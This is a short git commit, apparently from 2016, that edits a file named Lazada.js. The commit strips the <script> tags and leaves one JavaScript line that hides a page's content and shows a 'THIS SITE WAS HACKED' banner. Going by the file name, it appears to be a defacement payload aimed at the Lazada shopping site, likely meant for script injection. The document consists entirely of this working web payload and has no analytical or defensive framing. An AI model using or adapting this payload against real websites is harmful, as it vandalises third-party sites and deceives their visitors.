b7a0f8f4439b89c7275fd0aee09e5c8db2548187
f1nd0u7 <f1nd0u7@yahoo.com>
2016-09-28 21:52:42 +0700

    Bo the script

--- Lazada.js
+++ Lazada.js
@@ -1,3 +1,1 @@
-<script>
-	document.body.innerHTML="<style>body{visibility:hidden;}</style><div style=visibility:visible;><h1>THIS SITE WAS HACKED</h1></div>";
-</script>
+document.body.innerHTML="<style>body{visibility:hidden;}</style><div style=visibility:visible;><h1>THIS SITE WAS HACKED</h1></div>";
